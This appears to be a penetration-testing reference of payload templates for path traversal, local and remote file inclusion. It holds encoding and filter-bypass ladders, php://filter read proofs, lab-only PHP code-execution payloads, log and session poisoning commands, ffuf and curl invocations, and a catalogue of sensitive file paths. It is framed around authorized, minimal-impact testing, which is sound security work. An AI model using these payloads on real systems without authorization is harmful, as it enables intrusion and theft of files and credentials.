# Payloads & Templates — Path Traversal / LFI / RFI

All payloads are templates with `<PLACEHOLDER>` slots. Fill them for the
specific engagement; never paste live third-party targets. Ladders are ordered
by risk — climb only as far as authorization and impact proof require.

## 0. Safe-first proof ladder

**Rule: the first signal is always a harmless canary or a file you are already
entitled to (your own account's data). Never open with system files, and never
dump credentials.** Climb in this order and stop at two independent signals:

1. **Entitled read** — your own export/avatar/session data via the path param.
   Zero bystander impact, proves the sink opens files.
2. **Harmless canary** — `/etc/hostname` (Linux), the `[fonts]` header of
   `C:\Windows\win.ini` (Windows), a public asset you planted. OS-unique content
   rules out fixtures and reflection.
3. **Oracle signals** — existence/missing differential (existing file vs
   invented name) or a leaked resolved path in errors. Read-only, and it doubles
   as your confirmation channel.
4. **Minimal system evidence** — if you must show a system file: *one*
   signature line (`root:x:0:0:…`), one section header, or config **key names
   with values redacted**. That is the production evidence ceiling.
5. **Never** request or retain: `/etc/shadow`, private keys, `.aws/credentials`,
   token values, other users' files, bulk `.env` contents, `/proc/*/environ`
   bodies. "Reachable" is a claim; retrieval is not required to make it.

Execution proofs (log/session poisoning with PHP tags, `php://input`,
`data://` code) are **lab-only**: production stops at read-back of a marker you
injected yourself.

## 1. Encoding & normalization matrix

Reading rule: the "decoders that must fire" column is the whole point — a
payload only works when *exactly* that decode chain runs before path resolution.
If one decode is missing you get a literal `%2e…` path (harmless fail); if a
check sits between two decodes you get the classic bypass (V-06/V-12).

| # | Variant | Example payload | Decoders that must fire (in order) | Typical stack | Reality check |
|---|---|---|---|---|---|
| 1 | Plain | `../../../../etc/hostname` | None — only FS path resolution | No filter present | Baseline; always test first (V-03) |
| 2 | Single URL encode | `%2e%2e%2f%2e%2e%2f` · `..%2f` · `%2e%2e/` | One URL-decode (proxy or framework) before resolve | Apache/nginx + most apps | First rung when plain is stripped/blocked |
| 3 | **Double URL encode** | `%252e%252e%252f%252e%252e%252f` | Decode → check → **decode again** (2 passes: edge+app, or check-before-decode) | Layered stacks, WAF+PHP double-`urldecode` | Works only if *two* decoders fire; one pass ⇒ inert literal (V-06) |
| 4 | Triple encode | `%25252e%25252e%25252f` | Three decode passes | Rare (proxy→framework→lib) | Cheap to test once; record which layer consumed each level |
| 5 | **UTF-8 overlong** | `%c0%ae%c0%ae%c0%af` (overlong `. . /`) | A decoder accepting non-shortest UTF-8 forms | Legacy Tomcat/Java (`..%c0%af`), old IIS/PHP | **Dead on modern stacks** — one probe, never assume (V-12) |
| 6 | `%uXXXX` escape | `%u002e%u002e%u002f` | IIS/ASP-style `%u` unicode decode | Legacy IIS only | One probe; expect failure everywhere else |
| 7 | **Backslash variants** | `..\..\` · `..%5c` · `..\../` · `....\\` | Windows path normalization (both separators are `/`) — **or** a filter written for `/` only | Windows targets; filters with `/`-only regex | Linux: `\` is a filename char → payload fails (expected, not "safe") |
| 8 | **Null-byte legacy** | `file.php%00.png` · `../x%00` · `%2500` | C-string truncation at a native boundary (`%2500` needs a 2nd decode too) | PHP < 5.3.4, old C libs, ancient app servers | Dead on modern stacks — one round, then move on (V-05) |
| 9 | **Unicode slash** | `..%ef%bc%8f` (U+FF0F fullwidth) · `..%e2%88%95` (U+2215) · `..%e2%81%84` (U+2044) | NFKC-style normalization of path chars by the backend/OS (rare) | Some .NET/Java/OS combos | Mostly WAF *confusion*: test with a canary round-trip, never assume |
| 10 | **Path-sequence variants** | `....//....//` (strip-`../`-once recursion) · `..././` · `..//` · `....\/` · `..;/` + `/..;/` · `..%09/` `..%0a/` | A single-pass strip filter turns `....//` → `../`; Tomcat path-param stripping removes `..;/`; whitespace decodes inside segments | Filter breaks (V-01), servlet containers, WAF evasion (V-12) | Cheapest wins — test before any exotic encoding |
| 11 | Case / mixed hex | `%2E%2E%2F` · `%2e../` · `.%2e/` · `..%2F` | Case-sensitive literal match on lowercase hex or exact `../` | Naive regex filters/WAF rules | One request each; filters rarely normalize case |
| 12 | Windows extras | `C:\Windows\win.ini` · `file.php.` / `file.php%20` · `::$DATA` | Windows prefix handling; trailing-dot/space trim; NTFS ADS parse | IIS-era / Windows FS | Separate legacy probes (V-05/V-04) — evidence = one signature line |

Also note container tricks for anchoring: `/proc/self/cwd/<FILE>`,
`/proc/self/root/etc/hostname` (resolve through procfs when the app prefixes a
base dir and strips absolute inputs).

## 2. PHP wrapper templates — read-only proof patterns

**Rule: `php://filter` base64-encoding of a known file is *the* safe impact
proof** — it demonstrates arbitrary read with zero code execution. `php://input`
/ `data://` / log-poisoning **execution** escalations are lab-only (guardrail).

```bash
# READ-ONLY impact proof (production-appropriate)
GET /<SINK>?file=php://filter/convert.base64-encode/resource=<PLACEHOLDER_CANARY_PATH>
# round-trip check — must decode to exact canary bytes:
curl -s 'https://<TARGET>/<SINK>?file=php://filter/convert.base64-encode/resource=<PLACEHOLDER_CANARY_PATH>' \
  | tr -d '\n' | base64 -d 2>/dev/null | head -c 200

# Read-only variants (still no execution)
php://filter/read=convert.base64-encode/resource=<FILE>
php://filter/string.toupper/resource=<FILE>                 # transform proof
php://filter/convert.iconv.UTF-8/convert.base64-encode/resource=<FILE>
php://filter/zlib.deflate|convert.base64-encode/resource=<FILE>   # compact evidence

# Wrapper-support probe (returns YOUR text — proves wrapper parsing, not file read)
GET /<SINK>?file=data://text/plain,WRAPPER-PROBE-<TOKEN>

# Relative anchors when the app prefixes a base dir
php://filter/convert.base64-encode/resource=<KNOWN_LOCAL_FILE>
file://<PLACEHOLDER_CANARY_PATH>
/proc/self/cwd/<APP_FILE>          /proc/self/root<ABSOLUTE_CANARY>

# Archive/pack wrappers (read-only; need an upload first → V-10/V-11)
zip://<UPLOADED_ARCHIVE>#<ENTRY_NAME>
phar://<UPLOADED_ARCHIVE>/<INNER_PATH>      # note: phar metadata also hits unserialize

# LAB ONLY — execution escalation (never against production):
POST /<SINK>?file=php://input          body: <?php echo 'LAB-OK'; ?>    # allow_url_include=On
GET  /<SINK>?file=data://text/plain;base64,PD9waHAgZWNobyAnTEFCT0snOyA/Pg=
```

Cross-check rule: if the base64 decodes to garbage or to *your input*, the app
is not reading the file — that is a false positive, not a finding.

## 3. Filter-bypass ladder

Climb rung by rung; record block / no-effect / content per rung. Stop rule:
if two consecutive rungs change nothing **and** the oracle stays flat, the
filter holds — document that and pivot to another parameter instead of
spraying encodings.

**Rung 0 — baseline + oracle:** benign value, then existing-vs-missing file
comparison. Everything below is a differential against this.

**Rung 1 — dot-segment stripping** (single-pass `str_replace('../','')` and
siblings; the filter does half your work for you):

```
....//....//....//<CANARY>       ..././..././<CANARY>
..//..//<CANARY>                 ....\/....\/<CANARY>
..%2f..%2f<CANARY>               (encoding here is still rung 1 if strip is the filter)
```

**Rung 2 — filter recursion / encoding interaction** (strip runs at one
encoding level; sink decodes at another):

```
%2e%2e%2f%2e%2e%2f<CANARY>       # filter matches literal "../" only
..%2f..%2f<CANARY>               # filter matches "%2e" only
%252e%252e%252f<CANARY>          # strip after decode 1, sink decodes twice (V-06)
..%252f<CANARY>                  # mixed level — often missed by both rules
%2e%2e/%2e%2e/<CANARY>           # half-encoded: defeats exact-match regexes
```

**Rung 3 — case / encoding / whitespace / separator** (literal-match filters):

```
%2E%2E%2F<CANARY>   %2e../<CANARY>   .%2e/<CANARY>   ..%2F<CANARY>
..%09/<CANARY>   ..%0a/<CANARY>   ..%0d/<CANARY>   ..%20/<CANARY>
..%5c..%5c<CANARY>            # backslash — Windows targets (V-12 matrix)
..;/..;/<CANARY>              # servlet path-param stripping
<c0 af> overlong / fullwidth slash / %u002e    # legacy one-probes (expect fail)
```

**Rung 4 — wrapper / alternate vector** (path filters are airtight — change
the *kind* of input, not its encoding):

```
php://filter/convert.base64-encode/resource=<CANARY>   # read proof (§2)
data://text/plain,PROBE-<TOKEN>                        # wrapper support
zip://<UPLOAD>#<ENTRY>  ·  phar://<UPLOAD>/<PATH>      # via upload (V-10/V-11)
<ABSOLUTE_CANARY_PATH>                                # prefix-override sink
http://<PLACEHOLDER_OOB_DOMAIN>/rfi-001.txt           # URL param → V-02
<SESSION_DIR>/sess_<YOUR_ID>  ·  <LOG_PATH>           # V-13 / V-08 targets
```

## 4. Safe canary files per OS

| OS / context | Canary | "Good" response | Notes |
|---|---|---|---|
| Linux (first choice) | `/etc/hostname` | Short host-unique string | Non-secret, OS-unique, perfect first system read |
| Linux (alternates) | `/etc/issue`, `/etc/os-release`, `/proc/version` | Banner / distro ID / kernel string | `/proc/version` also fingerprints containers |
| Linux (proc anchors) | `/proc/self/cwd`, `/proc/self/cgroup` | App cwd path / container ID | Proves resolve-through-proc when abs paths are stripped |
| Windows | `C:\Windows\win.ini` | Keep **only** the `[fonts]` header line | Classic signature; minimal-excerpt rule applies |
| Windows (alt) | `C:\Windows\System32\drivers\etc\hosts` | Generic hosts file header | Use when `win.ini` is blocked |
| macOS | `/System/Library/CoreServices/SystemVersion.plist` | ProductVersion block | Rare target; harmless |
| App-owned / entitled | Your account export, planted upload, `/robots.txt` | Known content you already hold | **Start here** — zero bystander impact |
| Fixture check | Invented name: `/etc/notafile-<TOKEN>` | Distinct ENOENT / different error | Proves content came from the FS, not a bundled copy |

Evidence discipline: canary first → system file = one redacted signature line →
config = key names only, values redacted. `/etc/shadow`, keys, credentials,
other users' data: do not request.

## 5. Tool invocation templates

```bash
# --- ffuf: value fuzzing with a traversal wordlist (in-scope target only) ---
ffuf -u 'https://<TARGET>/download?file=FUZZ' \
     -w '<PLACEHOLDER_WORDLIST:traversal-encodings.txt>' \
     -mr '<PLACEHOLDER_CANARY_STRING>' \
     -mc 200,206 -fs '<PLACEHOLDER_BASELINE_LENGTH>' -t 20 -of csv

# --- ffuf: depth sweep (../ x N) against a path param ---
ffuf -u 'https://<TARGET>/view?file=FUZZ<PLACEHOLDER_CANARY_PATH>' \
     -w '<PLACEHOLDER_WORDLIST:dot-depths.txt>' \
     -mr '<PLACEHOLDER_CANARY_STRING>' -t 10

# --- ffuf: URL-path traversal against static locations ---
ffuf -u 'https://<TARGET>/static/FUZZ' \
     -w '<PLACEHOLDER_WORDLIST:traversal.txt>' \
     -mc 200 -fs '<PLACEHOLDER_BASELINE_LENGTH>' -t 15

# --- ffuf: wrapper fuzzing (rung 4) ---
ffuf -u 'https://<TARGET>/download?file=FUZZ' \
     -w '<PLACEHOLDER_WORDLIST:php-wrappers.txt>' \
     -mr '<PLACEHOLDER_CANARY_STRING>' -t 10

# Seed wordlists inline (expand per engagement; keep pacing modest):
#   traversal-encodings.txt  →  ../  ....//  %2e%2e%2f  %252e%252e%252f  ..%5c  ..;/
#   dot-depths.txt           →  ../  ../../  ../../../  …  ../../../../../../../../
#   php-wrappers.txt         →  php://filter/convert.base64-encode/resource=
#                               data://text/plain,  zip://  phar://  file://

# --- curl: canary read, evidence = first bytes only ---
curl -s 'https://<TARGET>/download?file=<PLACEHOLDER_CANARY_PATH>' | head -c 200

# --- curl: wrapper proof with round-trip check ---
curl -s 'https://<TARGET>/download?file=php://filter/convert.base64-encode/resource=<PLACEHOLDER_CANARY_PATH>' \
  | tr -d '\n' | base64 -d 2>/dev/null | head -c 200

# --- payload encoding without shell mangling ---
python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1], safe=''))" '<RAW_PAYLOAD>'

# --- log/session poisoning sequence (read-back proof) ---
curl -s -A 'LOGPOISON-<TOKEN>' 'https://<TARGET>/<ANY_LOGGED_ENDPOINT>'
curl -s -b 'PHPSESSID=<PLACEHOLDER_SESSION_TOKEN>' -d 'name=SESSIONMARK-<TOKEN>' \
  'https://<TARGET>/<SESSION_STORE_ENDPOINT>'

# --- Burp workflow: Decoder for stacked decodes, Repeater match/extract for the
# canary marker, Intruder with payload positions on the path param; compare
# block-page signatures (V-12) between plain and encoded variants. ---
```

## 6. Path catalogue (probe candidates)

- **Canaries:** `/etc/hostname`, `/etc/issue`, `/proc/version`, `/etc/os-release`,
  `C:\Windows\win.ini` (signature line only)
- **Logs (V-08):** `/var/log/apache2/access.log`, `/var/log/apache/access.log`,
  `/var/log/httpd/access_log`, `/var/log/nginx/access.log`,
  `/var/log/auth.log`, `/var/log/mail.log`, rotated `access.log.1` /
  `access.log.2.gz` (needs inflate filter), Windows
  `C:\xampp\apache\logs\access.log`, `C:\xampp\nginx\logs\access.log`,
  app logs `<APP_ROOT>/logs/<APP>.log`
- **Sessions (V-13):** `/var/lib/php/sessions/sess_<ID>` (+ `/0/`…`/6/` shard
  subdirs), `/var/lib/php5/sess_<ID>`, `/tmp/sess_<ID>`,
  `/var/lib/php/session/sess_<ID>`, `C:\xampp\php\tmp\sess_<ID>`
- **Root config (V-15 / discovery belongs to `info-disclosure-testing`):**
  `.env`, `.env.local`, `.git/HEAD`, `config.php`, `wp-config.php(.bak)`,
  `settings.py`, `application.yml`, `appsettings.json` — read for *structure*,
  redact all values

## 7. Chain it with

- **`rce-testing`** — LFI→RCE escalation: log/session poisoning execution
  proofs, `php://input`/`data://` payloads, file-upload → web shell once a
  traversal can land content in a parsed location, SSRF where an RFI/fetch sink
  appears (`url=` params route there directly). Upload-handling depth (extension
  matrices, handler remaps) lives in that skill.
- **`info-disclosure-testing`** — sensitive file discovery: finding *which*
  `.env`/`.git`/backup/sourcemap/phpinfo targets exist and exist-beneath which
  root, leaked `nginx.conf`/`php.ini` that confirm V-14/V-15 misconfigs, and
  `session.save_path` from phpinfo that makes V-13 deterministic. Redact every
  secret you find — report the class, don't hoard the material.
- **`xss-testing`** — RPO: relative-URL script masquerading evidence
  (crafted-path fetch + execution in a browser) is XSS-class impact — pair with
  that skill's payloads. Log-served content: poisoned log lines rendered into
  pages, or uploaded HTML/CSV/`Content-Type`-confused files, are stored/reflected
  XSS delivery — route the client-side evidence there.
- Suite neighbors: `bac-idor-testing` (tenant path segments swapped to another
  account — V-04 isolation mapping doubles as broken access control),
  `sandbox-escape-testing` (once file read lands you inside a container/sandbox
  with its own escape class).
